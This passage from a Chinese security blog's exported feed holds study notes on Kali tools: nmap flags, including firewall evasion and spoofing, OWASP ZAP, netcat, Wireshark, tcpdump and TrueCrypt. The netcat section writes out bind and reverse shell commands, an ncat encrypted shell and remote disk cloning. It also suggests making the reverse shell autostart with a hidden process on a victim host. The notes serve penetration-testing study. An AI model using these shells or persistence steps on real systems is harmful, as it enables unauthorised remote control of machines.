</ul>
<h2 id="service-version-detection"><a href="#service-version-detection" class="headerlink" title="service/version detection"></a>service/version detection</h2><ul>
<li>-sV<ul>
<li>目标端口跑的服务或其版本</li>
<li>与特征库中的指纹相对比，得到结果</li>
</ul>
</li>
<li>—version-intensity<ul>
<li>默认情况，与特征库比对，但不会全部比对，是比较粗略的</li>
<li>若想精确探测其版本，则可用此参数，探测强度0-9</li>
<li>需要与-sV相结合使用</li>
</ul>
</li>
<li>—version-light<ul>
<li>即探测强度为2的情况</li>
</ul>
</li>
<li>—version-all<ul>
<li>即探测强度为9的情况</li>
<li>最强的是9</li>
</ul>
</li>
<li>—version-trace<ul>
<li>追踪其探测过程，将其详细信息打印出来</li>
</ul>
</li>
</ul>
<h2 id="script-scan"><a href="#script-scan" class="headerlink" title="script scan"></a>script scan</h2><ul>
<li>-sC<ul>
<li>使用默认的脚本</li>
<li>等于—script=default</li>
</ul>
</li>
<li>—script<ul>
<li>指定使用的脚本</li>
</ul>
</li>
<li>—script-args<ul>
<li>给所使用的脚本提供参数</li>
</ul>
</li>
<li>—script-args-file<ul>
<li>提供的脚本参数在文件里</li>
</ul>
</li>
<li>—script-trace<ul>
<li>追踪过程，即将详细信息打印出来</li>
</ul>
</li>
<li>—script-updatedb<ul>
<li>更新脚本数据库</li>
</ul>
</li>
<li>—script-help<ul>
<li>指定某一脚本，显示其帮助信息</li>
</ul>
</li>
</ul>
<h2 id="OS-detection"><a href="#OS-detection" class="headerlink" title="OS detection"></a>OS detection</h2><ul>
<li>-O<ul>
<li>启用系统探测</li>
</ul>
</li>
<li>—osscan-limit<ul>
<li>限制nmap只对确定的主机进行os探测</li>
<li>至少需确知该主机分别有一个open和closed的端口</li>
</ul>
</li>
<li>—osscan-guess<ul>
<li>大胆猜测对方主机的系统类型</li>
<li>由此准确性会下降</li>
</ul>
</li>
</ul>
<h2 id="timing-and-performance"><a href="#timing-and-performance" class="headerlink" title="timing and performance"></a>timing and performance</h2><ul>
<li>-T<ul>
<li>指定扫描的速度</li>
<li>0-5，越大越快</li>
</ul>
</li>
<li>—min-hostgroup/max-hostgroup<ul>
<li>并行扫描时，控制每一组的最大主机数目（或最小</li>
<li>很少使用，但都用于保持组的大小在一个范围内</li>
</ul>
</li>
<li>—min-parallelism/max-parallelism<ul>
<li>调整探测报文的并行度，即并行的数量</li>
</ul>
</li>
<li>—min-rtt-timeout/max～/initial～<ul>
<li>设置报文超时的时间（等待探测报文响应的时间</li>
<li>若超过，则放弃</li>
</ul>
</li>
<li>—max-retries<ul>
<li>实际情况，可能会因为网络状况导致包丢失，则会retry</li>
<li>设置最大重新探测的次数</li>
</ul>
</li>
<li>—host-timeout<ul>
<li>设置等待主机响应德时间</li>
<li>放弃低速目标主机</li>
</ul>
</li>
<li>—scan-delay/—max-scan-delay<ul>
<li>发送每个探测请求的间隔时间</li>
<li>频繁探测会使目标觉察</li>
</ul>
</li>
<li>—min-rate/max-rate<ul>
<li>每秒发送包的最小最大数量</li>
</ul>
</li>
</ul>
<h2 id="firewall-ids-evasion-and-spoofing"><a href="#firewall-ids-evasion-and-spoofing" class="headerlink" title="firewall/ids evasion and spoofing"></a>firewall/ids evasion and spoofing</h2><ul>
<li>-f；—mtu<ul>
<li>-f指定报文分段数</li>
<li>—mtu指定mtu，即最小传输单元</li>
</ul>
</li>
<li>-D<ul>
<li>混杂进一些虚假IP，增加噪声，使目标难以分辨真正的nmap主机</li>
<li>nmap -D ip1,ip2… 目标IP</li>
</ul>
</li>
<li>-S<ul>
<li>欺骗源地址</li>
<li>若于目标主机位于同一网段，则其可知自己Mac地址，故可收到响应（外网呢？</li>
<li>存在明显弊端，（具体bd</li>
<li>一般与-e结合，指定发送的接口，如-e eth0</li>
</ul>
</li>
<li>-e<ul>
<li>指定出口网卡</li>
</ul>
</li>
<li>-g/–source-port<ul>
<li>指定扫描时的源端口，-g10000</li>
</ul>
</li>
<li>—proxies<ul>
<li>指定代理服务器</li>
</ul>
</li>
<li>—data<ul>
<li>在请求包的数据位置，加入自定义数据</li>
<li>十六进制</li>
</ul>
</li>
<li>—data-string<ul>
<li>加自定义的ascii string</li>
</ul>
</li>
<li>—data-length<ul>
<li>发送报时，附加指定数量的随机字节数据</li>
</ul>
</li>
<li>—ip-options<ul>
<li>制定自定义的IP选项</li>
</ul>
</li>
<li>—ttl<ul>
<li>发送IP ttl field</li>
</ul>
</li>
<li>—spoof-mac<ul>
<li>欺骗mac地址，让目标误以为是别的mac发出的</li>
</ul>
</li>
<li>—badsum<ul>
<li>故意发送错误的chksum包（chksum用于校验）</li>
</ul>
</li>
</ul>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><ul>
<li>-6<ul>
<li>启用ipv6</li>
</ul>
</li>
<li>-A<ul>
<li>启用系统探测、版本探测、脚本扫描及traceroute等</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-OWASP_ZAP</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-OWASP-ZAP/</url>
    <content><![CDATA[<h1 id="扫描工具之OWASP-ZAP"><a href="#扫描工具之OWASP-ZAP" class="headerlink" title="扫描工具之OWASP_ZAP"></a>扫描工具之OWASP_ZAP</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>Zed attack proxy ，开源，免费，跨平台</li>
<li>基于Java语言</li>
<li>web application集成渗透测试和漏洞挖掘工具</li>
</ul>
<h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><ul>
<li>保存session问题<a id="more"></a><ul>
<li>每次启动都会询问是否保存本次会话到本地</li>
<li>每次启动都是一个zap实例，或者zap会话，以保存扫描记录等</li>
<li>保存后下次可直接导入会话，不需再次扫描</li>
<li>可选项<ul>
<li>基于系统时间戳保存，默认方式</li>
<li>自行选择保存路径及名字，用户自定义保存</li>
<li>不保存</li>
</ul>
</li>
</ul>
</li>
<li>插件及更新问题<ul>
<li>启动时询问检查更新并安装</li>
<li>可安装不同插件以供使用<ul>
<li>plugin或add_on，不同软件其插件名称不同</li>
<li>release正式发布版本，beta测试版本，alpha，测试版本，低于beta</li>
<li>建议安装release和beta，alpha自行决定</li>
</ul>
</li>
<li>建议每次使用前进行zap及其插件的更新</li>
</ul>
</li>
<li>截断代理功能<ul>
<li>启动后默认开启端口监听</li>
<li>默认监听8080端口</li>
<li>浏览器设置对应代理端口</li>
<li>浏览器端访问网站，zap端记录所有访问请求，以备后续测试</li>
<li>即手动爬网过程</li>
<li>自动配置代理<ul>
<li>针对Firefox24.0及以上版本</li>
<li>plug-n-hack按钮，以脚本形式自动配置浏览器代理</li>
</ul>
</li>
</ul>
</li>
<li>扫描功能<ul>
<li>主动扫描<ul>
<li>身份认证问题，如登录后才可以访问的页面</li>
<li>两种方式<ul>
<li>quick start界面，指定URL，点击攻击<ul>
<li>会先进行主动爬网</li>
</ul>
</li>
<li>站点界面，右键，攻击-active scan<ul>
<li>不会爬网</li>
<li>代理截断后，针对已获取的流量</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>被动扫描<ul>
<li>截断代理时，针对截获的流量进行被动分析</li>
</ul>
</li>
</ul>
</li>
<li>Fuzzer<ul>
<li>暴力破解和目录穷举皆为fuzz范畴</li>
<li>启动方式不唯一（其他功能如扫描也是如此</li>
<li>fuzz所用字段可自定义字符串或文件，也可使用zap内置payload，如常见密码，常见目录名，sql注入相关语句等</li>
<li>类似burp的intruder模块</li>
</ul>
</li>
<li>API<ul>
<li>很多其他工具都有提供API功能</li>
<li>其提供的程序调用接口，以此来进行进一步开发</li>
<li>使用代理的情况下，访问http：//zap，查看相关文档</li>
</ul>
</li>
</ul>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li>扫描模式<ul>
<li>四种模式，safe、protected、standard、attack，攻击程度递增</li>
</ul>
</li>
<li>扫描策略<ul>
<li>存在默认策略，可以此为基础修改</li>
<li>可自定义添加策略<ul>
<li>报警预值，扫描强度等设置</li>
</ul>
</li>
</ul>
</li>
<li>anti scrftoken<ul>
<li>针对某些站点使用token防止csrf</li>
<li>详情自行google</li>
</ul>
</li>
<li>https的证书问题</li>
<li>scope、context、filter<ul>
<li>为目标划定范围，达到过滤目的</li>
<li>content为一个请求URL，站点或其目录，理解为一个目标</li>
<li>一个scope包括多个context，即多个目标</li>
</ul>
</li>
<li>身份认证相关<ul>
<li>四种：基于表单、manual、http、基于脚本</li>
<li>建议manual方式，即浏览器输入账号密码手动认证</li>
<li>针对web应用，使用表单认证</li>
<li>支持基于脚本的认证，需要自编写<ul>
<li>zap中脚本可用于多个功能模块</li>
</ul>
</li>
</ul>
</li>
<li>http session<ul>
<li>zap存在内置session的名字，默认的集合，都是些很常见的名称</li>
<li>某session字段名称存在于其集合时，zap会识别，判断其为session字段</li>
<li>对于很多站点独特的session字段，因为其不在集合中，故不会判断其为session，此时需要手动添加</li>
</ul>
</li>
<li>note/tag<ul>
<li>针对扫描结果或者说是扫描时的请求</li>
<li>添加备注简单记录</li>
<li>添加tag简单分组</li>
</ul>
</li>
<li>字符串编码、解码、哈希</li>
<li>截断功能<ul>
<li>zap界面中类似音乐播放、快进、暂停按钮</li>
<li>类似于burp</li>
<li>代理与截断不同，都是浏览器发送请求，请求都到达zap，但是对于发包，前者自动，后者手动</li>
</ul>
</li>
<li>显示隐藏域<ul>
<li>zap界面中小灯泡按钮</li>
<li>很对html页面存在隐藏域，如form中input的hidden属性</li>
<li>截断时，若开启此设置，zap在接收到响应时会去除其隐藏属性，使其显示在浏览器</li>
</ul>
</li>
</ul>
<h2 id="标准扫描工作流程"><a href="#标准扫描工作流程" class="headerlink" title="标准扫描工作流程"></a>标准扫描工作流程</h2><ul>
<li>设置代理<ul>
<li>zap监听端口，浏览器设置对应端口的代理</li>
</ul>
</li>
<li>手动爬网<ul>
<li>代理时，浏览器尽可能点击多个页面，此时可能会针对已截获的请求进行被动扫描</li>
</ul>
</li>
<li>自动爬网<ul>
<li>可针对某一目录，弥补手动爬网缺陷，如某些不可见链接</li>
</ul>
</li>
<li>主动扫描<ul>
<li>有了爬取结果后，进行主动扫描，对各请求提交参数测试</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-基本工具</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="Kali实战-基本工具"><a href="#Kali实战-基本工具" class="headerlink" title="Kali实战-基本工具"></a>Kali实战-基本工具</h1><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><ul>
<li>简介<ul>
<li>网络工具中的瑞士军刀</li>
<li>可简称nc</li>
</ul>
</li>
<li>常用参数<ul>
<li>v：显示详细信息</li>
<li>n：只允许数字形式的IP地址，不进行dns解析<ul>
<li>作为客户端</li>
<li>不建议跟域名，域名解析任务交由nc，可能会比较慢<a id="more"></a></li>
</ul>
</li>
<li>l，p：监听指定端口，等待连接；作为服务端</li>
</ul>
</li>
<li>常见使用<ul>
<li>取代telnet获取banner信息<ul>
<li>作为客户端</li>
<li>nc -nv 123.123.123.123 25/110/80</li>
<li>110端口为POP3，25端口为SMTP<ul>
<li>连接后可以返回banner信息</li>
<li>连接后可以进行身份认证等进一步操作，认证成功可以进行收发邮件等操作</li>
<li>POP3身份验证信息（用户名和密码）需要进行base64编码</li>
<li>kali命令行下base64命令，直接进行编码</li>
</ul>
</li>
<li>80或其他http端口<ul>
<li>连接后可显示banner信息</li>
<li>连接后可输入命令进一步操作，如 head /，显示页面信息</li>
<li>http相关命令，如 head /，显示页面信息</li>
</ul>
</li>
</ul>
</li>
<li>传输文本信息，做电子取证<ul>
<li>用到服务端和客户端</li>
<li>可实现点对点的、简单的即时通信<ul>
<li>服务端：nc -l -p 3333</li>
<li>客户端：nc -nv 123.123.123.123 3333</li>
</ul>
</li>
<li>远程电子取证信息收集<ul>
<li>本机：nc -l -p 3333</li>
<li>待取证主机：ls -l | nc -nv 123.123.123.123 3333（|为管道</li>
<li>即时显示在本机</li>
</ul>
</li>
<li>大量取证信息时<ul>
<li>本机：nc -l -p 3333 &gt; res.txt</li>
<li>待取证主机：ps -aux | nc -nv 123.123.123.123 3333 -q 1<ul>
<li>|为管道符</li>
<li>q参数：标准输入完成之后等待指定秒数后主动结束nc进程</li>
<li>若不加q，无法判断命令是否执行成功；</li>
<li>加q，若进程结束，则表示执行成功</li>
</ul>
</li>
<li>结果导出至本地文件</li>
</ul>
</li>
</ul>
</li>
<li>传输文件及目录<ul>
<li>传输文件<ul>
<li>服务端收，客户端发<ul>
<li>s：nc -lp 3333 &gt; res.mp4</li>
<li>c: nc -nv 123.123.123.123 &lt; a.mp4 -q 2</li>
</ul>
</li>
<li>服务端发，客户端收<ul>
<li>s：nc -q 2 -lp 3333 &lt; a.mp4</li>
<li>c: nc -nv 123.123.123.123 &gt; res.mp4</li>
</ul>
</li>
<li>大于号将结果输出到指定文件；小于号将文件内容导入命令</li>
</ul>
</li>
<li>传输目录<ul>
<li>同传输文件，只是增加打包和解包的过程</li>
<li>A：tar -cvf - test/ | nc -lp 1234 -q 2</li>
<li>B：nc -nv 123.123.123.123 | tar -xvf -</li>
</ul>
</li>
<li>加密传文件<ul>
<li>同传输文件，只不过增加加密和解密的命令</li>
<li>A：mcrypt —flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 222.222.222.222 -q 2</li>
<li>B：nc -lp 1234 | mcrypt —flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</li>
</ul>
</li>
</ul>
</li>
<li>流媒体服务<ul>
<li>依然需要服务器端和客户端</li>
<li>A：cat 1.mp4 | nc -lp 1234（服务端</li>
<li>B：nc -nv 1.1.1.1 1234 | mplayer -vo x11 -cache 3000 -（客户端</li>
</ul>
</li>
<li>端口扫描<ul>
<li>nc -nvz 1.1.1.1 1-65535<ul>
<li>默认tcp探测</li>
<li>z参数用于扫描，h参数查看帮助</li>
</ul>
</li>
<li>nc -nvzu 1.1.1.1 1-1024<ul>
<li>u表示udp探测</li>
</ul>
</li>
<li>只有z参数用于扫描，远不如其他扫描工具如nmap强大</li>
</ul>
</li>
<li>远程克隆硬盘<ul>
<li>远程电子取证，将目标服务器硬盘远程复制，或者内存</li>
<li>A：nc -lp 1234 | dd of=/dev/sda<ul>
<li>（取证端</li>
</ul>
</li>
<li>B：dd if=/dev/sda | nc -nv 1.1.1.1 1234 -q 1（被取证端</li>
</ul>
</li>
<li>远程控制<ul>
<li>正向<ul>
<li>A：nc -lp 3333 -c bash（s端，被攻击者</li>
<li>B：nc 1.1.1.1 3333（c端，攻击者</li>
<li>说明<ul>
<li>被攻击者开启端口作为服务器端</li>
<li>攻击者连接其受害者ip和端口</li>
<li>连接成功后，受害者将其shell发送至攻击者</li>
<li>连接方向：外-内</li>
</ul>
</li>
</ul>
</li>
<li>反向<ul>
<li>A：nc -lp 3333（s端，攻击者</li>
<li>B：nc 1.1.1.1 3333 -c bash（c端，被攻击者</li>
<li>说明<ul>
<li>攻击者开启端口，作为服务端</li>
<li>受害者主动连接攻击者</li>
<li>连接成功后，受害者将自己shell发送给攻击者</li>
<li>连接方向：内-外</li>
</ul>
</li>
</ul>
</li>
<li>其它<ul>
<li>若是Windows系统，将bash改为cmd</li>
<li>主动连接往往受限制，服务器设置为仅对外开放80端口，其它外来连接会被防火墙ban掉</li>
<li>被动连接，内网服务器主动去连接外网攻击者，一般管理员不会限制其向外访问的端口，如dns的53端口</li>
<li>在受害者一端，将nc命令保存为脚本，设置其自启动，并采取措施隐藏其运行进程，随用随连</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>缺陷<ul>
<li>nc缺乏加密和身份验证的能力<ul>
<li>传输的数据都是不加密的，明文传输便可能被嗅探，被中间人劫持所威胁</li>
<li>获取远程shell时，nc开启端口后，其他人若扫描到，也可以进行连接，没有身份验证的机制来判断是不是正常用户来连接的</li>
</ul>
</li>
<li>ncat工具<ul>
<li>简介<ul>
<li>弥补nc的缺乏加密和身份验证的不足</li>
<li>ncat包含于nmap工具包中</li>
<li>nc可完成的功能ncat也均能实现</li>
<li>nmap不仅只是一个工具，安装后也会有其工具包</li>
</ul>
</li>
<li>使用举例<ul>
<li>A：ncat -c bash —allow 1.1.1.1 -vnl 333 —ssl<ul>
<li>服务器端即被控端</li>
<li>-c bash即通nc的，连接后发送一个bash</li>
<li>1.1.1.1为本端允许被哪个IP连接，即客户端IP，通过此，实现了身份验证的目的</li>
<li>监听333端口</li>
<li>使用ssl，对通信管道加密，即不论里面传输什么，对嗅探者都是加密的</li>
</ul>
</li>
<li>B：ncat -nc 2.2.2.2 333 —ssl<ul>
<li>客户端即控制端</li>
<li>2.2.2.2和333:为服务端即被控端IP和端口</li>
<li>—ssl：保证两端都使用加密的方式来建立连接</li>
</ul>
</li>
<li>说明<ul>
<li>连接建立后，客户端就返回了服务端的一个shell，可进行远程控制；与一般nc建立的连接有本质区别，是经过加密的</li>
<li>身份验证功能：是通过服务端的allow参数来设置允许连接的IP地址，来实现的；来自于其它地址的连接不被允许</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>不同系统或平台的nc参数和功能不尽相同（由于nc本身版本的不同<ul>
<li>如ubuntu中的nc没有-c参数</li>
<li>若控制端和被控端其版本不同，使用时先自行查找其帮助信息，有些参数是不可以兼容使用的（nc -h或man nc</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><ul>
<li>简介<ul>
<li>抓包嗅探协议分析</li>
<li>安全从业者必备技能</li>
<li>抓包引擎<ul>
<li>Linux：Libpcap9</li>
<li>Windows：Winpcap10</li>
</ul>
</li>
<li>解码能力</li>
</ul>
</li>
<li>基本使用方法<ul>
<li>启动</li>
<li>选择抓包网卡并start<ul>
<li>电脑有多块网卡</li>
<li>可以定制筛选器Filter，只抓符合要求的</li>
</ul>
</li>
<li>混杂模式<ul>
<li>不启用：仅抓取本机当前网卡的</li>
<li>启用：可抓取当前网络下其他主机的</li>
</ul>
</li>
<li>实时抓包<ul>
<li>当前网卡有网络活动，可以实时抓包并显示在界面</li>
<li>停止抓包后，可以对已抓取的进行保存</li>
</ul>
</li>
<li>保存和分析捕获文件<ul>
<li>建议保存为pcap格式（兼容性好，其他工具也适用，</li>
<li>可打开已有数据包进行分析</li>
</ul>
</li>
<li>首选项（即设置<ul>
<li>对显示界面的布局等做自定义设置</li>
<li>每条记录即一个包信息，可设置显示的列即字段</li>
<li>显示字体及不同记录类型的显示颜色的设置</li>
</ul>
</li>
</ul>
</li>
<li>筛选器（过滤器<ul>
<li>目的：过滤掉干扰的数据包</li>
<li>简单分类<ul>
<li>抓包筛选器<ul>
<li>抓包前</li>
<li>对要抓取的数据包做限制</li>
</ul>
</li>
<li>显示筛选器<ul>
<li>抓包后</li>
<li>对已经抓取的数据包做过滤</li>
<li>对抓包筛选器的二次过滤</li>
<li>使用较前者频繁</li>
</ul>
</li>
</ul>
</li>
<li>过程：网络-抓包筛选器-抓包引擎-显示筛选器</li>
<li>显示筛选器简单使用<ul>
<li>可以多个过滤条件叠加，即多个过滤表达式叠加</li>
<li>直接利用协议筛选，如http，之后apply</li>
<li>在记录内容处右键，选择apply for filter，如IP包头中，IP地址处，右键…<ul>
<li>可选择selected、no selected、and…、or…</li>
<li>注意selected的与或非</li>
<li>会在filter框中自动生成过滤表达式</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>常见协议包<ul>
<li>数据包的分层结构<ul>
<li>每一条记录对应一个数据包，其结构是分层的</li>
<li>第一层<ul>
<li>Frame，帧层面</li>
<li>显示的是统计信息</li>
</ul>
</li>
<li>第二层<ul>
<li>如以太网协议</li>
<li>其type字段表示上层协议是什么，即第三层的</li>
</ul>
</li>
<li>第三层<ul>
<li>如IP协议</li>
<li>其protocol字段显示上层协议是什么，即第四层的</li>
</ul>
</li>
<li>第四层<ul>
<li>如UDP、TCP，还有其他，不止U和T</li>
</ul>
</li>
<li>第五层<ul>
<li>应用层协议，如http，dns</li>
</ul>
</li>
</ul>
</li>
<li>常见协议<ul>
<li>ARP</li>
<li>ICMP</li>
<li>TCP-三次握手<ul>
<li>面向连接</li>
<li>正式通信前要先建立连接，即三次握手</li>
<li>a-b之间建立连接<ul>
<li>a向b：SYN包</li>
<li>b向a：[SYN，ACK]包</li>
<li>a向b：ACK包</li>
</ul>
</li>
</ul>
</li>
<li>UDP<ul>
<li>面向无连接，不管对方是否已接收到</li>
<li>开销较TCP小</li>
</ul>
</li>
<li>DNS<ul>
<li>域名解析相关</li>
<li>基于UDP，应用层协议</li>
</ul>
</li>
<li>HTTP<ul>
<li>基于TCP，应用层协议</li>
<li>明文协议</li>
</ul>
</li>
<li>FTP</li>
</ul>
</li>
<li>其他<ul>
<li>Wireshark默认以端口号识别协议类型，如80的http</li>
<li>但是某些网站会工作在其他端口，此时：右键包，decode as…，选择http，以http协议来处理。</li>
</ul>
</li>
</ul>
</li>
<li>TCP数据流相关<ul>
<li>一次通信会涉及多个数据包（如一个大的http页面）右键选择follow tcp stream，跟踪tcp流，查看整个访问过程</li>
<li>相关协议：http、POP3、smtp、SSL，<ul>
<li>前三是明文协议，用户可读（邮件传输可能会有base64，也很容易被解码</li>
<li>SSL是加密的<ul>
<li>前期明文</li>
<li>后期密文</li>
</ul>
</li>
<li>ssl相关的包可右键follow ssl stream</li>
<li>SSL建立通信前会进行公钥等的传输；其之前的传输是明文的，可获取公钥的明文信息；但截获公钥并无安全隐患，其本来就是公开的</li>
</ul>
</li>
</ul>
</li>
<li>信息统计<ul>
<li>位于statics标签<ul>
<li>summary：显示摘要信息</li>
<li>endpoint：显示节点，各协议涉及的通信对象列表</li>
<li>protocol hierarchy：协议分布情况</li>
<li>packets lengths：包大小分布情况</li>
<li>conversation：会话连接情况</li>
</ul>
</li>
<li>解码方式<ul>
<li>Wireshark默认以端口号判断当前使用协议，但不准确，如ftp跑在80端口</li>
<li>需手动解码，右键decode as</li>
</ul>
</li>
<li>专家系统<ul>
<li>analyse—expert info</li>
<li>专家系统的好坏也是评判软件好坏的标准</li>
<li>由已知流量包给出报警及建议信息</li>
</ul>
</li>
</ul>
</li>
<li>实践<ul>
<li>抓包nc（无加密）ncat（加密）</li>
<li>企业抓包部署方案<ul>
<li>Sniffer</li>
<li>Cace/riverbed</li>
<li>Cascad pilot</li>
</ul>
</li>
</ul>
</li>
<li>其它<ul>
<li>Wireshark官网存在各种协议包以供学习，自行下载</li>
<li>缺点：抓取大量主机、面对大流量时会很卡</li>
</ul>
</li>
</ul>
<h2 id="TcpDump"><a href="#TcpDump" class="headerlink" title="TcpDump"></a>TcpDump</h2><ul>
<li>简介<ul>
<li>Wireshark是图像化界面，但好多Linux安装后是没有图形化的纯字符界面；此外，Wireshark不是默认安装的，需自己下载安装；Wireshark虽然也有命令行的，但是也需要自己安装，也会麻烦</li>
<li>tcpdump是No-GUI的抓包分析工具</li>
<li>Linux、unix系统默认安装</li>
</ul>
</li>
<li>常见使用<ul>
<li>抓包<ul>
<li>默认只抓68字节</li>
<li>tcpdump -i eth0 -s 0 -w file.pcap<ul>
<li>-i：指定抓取的接口，interface</li>
<li>-s：指定抓取数据包的大小（0指数据包有多大就抓多大，默认只抓取数据包的前68字节</li>
<li>-w：指定抓取数据包的保存文件</li>
</ul>
</li>
<li>tcpdump -i eth0 port 22<ul>
<li>使用抓包筛选器</li>
<li>port 22：只抓指定端口的数据包（如22</li>
<li>tcp port 22:只抓tcp 端口的数据包（如22，也可以udp</li>
</ul>
</li>
</ul>
</li>
<li>读取抓包文件<ul>
<li>tcpdump -r file.pcap<ul>
<li>-r：指定读取的文件（默认显示摘要信息，较简单</li>
<li>-A：以ascii码的形式显示其内容</li>
<li>-X：以16进制的形式显示</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>筛选相关<ul>
<li>显示筛选器<ul>
<li>同Wireshark，存在抓包筛选器和显示筛选器</li>
<li>tcpdump -n -r http.cap | awk ‘{print $3}’ | sort -u<ul>
<li>-n：显示IP，而不是域名形式</li>
<li>sort -u：可以去掉重复项</li>
<li>通过Linux系统命令来进行筛选</li>
</ul>
</li>
<li>tcpdump -n src host 1.1.1.1 -r http.pcap<ul>
<li>src host：筛选源地址，主机</li>
</ul>
</li>
<li>tcpdump -n dst host 2.2.2.2 -r http.pcap<ul>
<li>dst host ：筛选目的地址，主机</li>
</ul>
</li>
<li>tcpdump -n port 53 -r http.pcap<ul>
<li>port 50:筛选指定端口</li>
<li>或tcp port 53，再指定协议（或udp等其它</li>
</ul>
</li>
<li>tcpdump -nX port 80 -r http.pcap<ul>
<li>-X：以16进制的形式</li>
</ul>
</li>
</ul>
</li>
<li>高级筛选功能<ul>
<li>以tcp数据包为例，结合其结构，如下：</li>
<li>tcpdump -A -n ‘tcp[13]=24’ -r http.pcap<ul>
<li>tcp数据包第十四个字节，十进制为24，即ACK和PSH位为1的</li>
<li>-A：以ascii码的形式</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="文档记录工具"><a href="#文档记录工具" class="headerlink" title="文档记录工具"></a>文档记录工具</h2><ul>
<li>简介<ul>
<li>过程文档目录是很有必要的</li>
<li>工作过程可能是团队合作，个人需纪录，供团队查看</li>
<li>工作过程中纪录相关信息，可用于威胁建模等</li>
<li>最终渗透测试报告的重要信息来源</li>
</ul>
</li>
<li>Dradis<ul>
<li>短期临时小团队资源共享</li>
<li>基于web和浏览器，开启后默认监听3004端口，浏览器访问</li>
<li>输入账号和密码登陆（一般只输入密码即可，因为渗透测试工作的人员是不固定的，再维护人员的账号和密码就不太有必要，dradis就遵循此原则，初始化后，无需输入账号，各成员仅输入密码即可登陆</li>
<li>本机开启后，其他人访问本IP和相应端口，输入正确密码后，即可登陆，可上传资料，实现成员间共享信息</li>
<li>dradis中含有许多其他工具的插件，可用来向其中导入工具记录（如nmap的扫描记录，nmap扫描时导出至一个结果文件，dradis中选择nmap类型及对应的结果文件，可实现上传）</li>
<li>含多种插件供导入文件，导入后，也可选择类型进行导出，如导出为html文件</li>
</ul>
</li>
<li>Keepnote<ul>
<li>也可以纪录相关信息，层级记录</li>
<li>类似笔记app，一个项目笔记本下，可新建子目录及子文件，用于记录信息</li>
<li>记录后，也可将其导出，如导出至html文件</li>
</ul>
</li>
<li>Truecrypt<ul>
<li>简介<ul>
<li>渗透测试工作涉及许多敏感信息，其纪录的文件不应随手乱放，需进行加密处理</li>
<li>尽管truecrypt很优秀，但14年已停止更新，理由是安全性不够，但安全专家测试后，仍证明其优秀的安全性</li>
<li>Linux平台和Windows平台都可使用</li>
<li>类似的软件bitlocker，其官方停止更新时有提到</li>
</ul>
</li>
<li>使用<ul>
<li>创建加密卷<ul>
<li>创建标准的<ul>
<li>1，create volume：创建一个卷<ul>
<li>创建一个加密的文件容器（最常用，以此为例</li>
<li>或使用当前分区或drive来创建一个卷</li>
</ul>
</li>
<li>2，volume type：选择卷类型<ul>
<li>standard truecrypt volume</li>
<li>hidden truecrypt volume（加密盘里面又隐藏了一块加密的区域</li>
</ul>
</li>
<li>3，volume location：选择卷保存的路径</li>
<li>4，encryption options：选择加密的算法（默认是AES，在此页面也选择hash算法</li>
<li>5，volume size：制定卷的大小（如100M</li>
<li>6，volume password：给加密卷设置密码</li>
<li>7，format option：选择文件格式，FAT还是Ext3</li>
<li>8，cross-platform support：选择仅Linux平台使用还是其它平台也可使用（视情况而定</li>
<li>9，最终生成加密文件如c1</li>
</ul>
</li>
<li>创建隐藏的加密卷<ul>
<li>以上创建的是标准的</li>
<li>1，volume type时选择hidden的</li>
<li>2，outer volume size：选择外部的卷的大小（其内部隐藏有另一加密区域</li>
<li>3，outer volume password：给外部卷的访问设置密码</li>
<li>4，之后创建好一个外部卷，也以一个硬盘的形式显示（外部卷用于迷惑别人</li>
<li>5，再按类似的步骤创建一个hidden的（其大小不能超过outer的；且密码不能与outer的相同</li>
<li>6，使用时，输入outer密码进入outer，输入hidden密码进入hidden的</li>
</ul>
</li>
</ul>
</li>
<li>使用加密卷<ul>
<li>1，选择加密文件，如上述生成的c1文件</li>
<li>2，点击挂载</li>
<li>3，输入密码</li>
<li>4，身份验证通过后，此加密文件以一个硬盘的形式显示在系统</li>
<li>5，在硬盘中添加相应信息后，即操作完成后，要dismount</li>
<li>6，对于隐藏的，输入outer密码进入outer，输入hidden密码进入hidden的</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-BurpSuite</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-BurpSuite/</url>
    <content><![CDATA[<h1 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>web安全工具中的瑞士军刀；Java开发；倘若只有一个工具供选择，一定选择burp</li>
<li>统一的集成工具；发现全部现代web安全漏洞</li>
